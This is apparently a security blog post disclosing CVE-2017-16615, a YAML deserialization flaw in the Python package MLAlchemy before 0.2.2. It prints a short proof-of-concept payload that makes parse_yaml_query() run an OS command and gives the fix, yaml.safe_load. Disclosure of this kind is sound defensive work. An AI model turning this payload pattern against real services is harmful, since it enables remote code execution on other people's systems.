---
layout: post
title: "CVE-2017-16615: Critical RESTful Web Applications Vulnerability"
date: 2017-11-08 19:53:05 +0800
comments: true
categories: vulnerability
---


<font size="4">**Python Package:**　　[MLAlchemy](https://pypi.python.org/pypi/mlalchemy/)  </font>
 
<font size="4"> **Version:**　　　　　 Before 0.2.2  </font>

<font size="4"> **Published:**　　　　Nov. 7th. 2017  </font>

<font size="4"> **Reported by:** 　　　　　 Joel  </font>

<font size="4"> **CVE-2017-16615** 　　　[CVE_details](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16615) </font>


## Overview 

`MLAlchemy` is a Python-based utility library aimed at allowing relatively safe conversion from YAML/JSON to SQLAlchemy read-only queries. One use case here is to allow RESTful web applications (written in Python) to receive YAML- or JSON-based queries for data, e.g. from a front-end JavaScript-based application. By exploiting vulnerability, attackers can execute arbitrary python commands resulting in command execution. Due to a wide range of involved, the vulnerability is extremely dangerous.

An issue was discovered in the `MLAlchemy` package before `0.2.2`.Untrusted data passed into the `parse_yaml_query()` function can execute arbitrary python commands resulting in command execution.


## POC

```
from mlalchemy import parse_yaml_query
parse_yaml_query('!!python/object/apply:os.system ["calc.exe"]')

```
##### Poc Video

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/AnjFmHI8FzY" frameborder="0" gesture="media" allowfullscreen></iframe></center>

## Remediation

The updated versions of `MLAlchemy (0.2.2)` correctly use the `yaml.safe_load` method which prevents remote code execution.

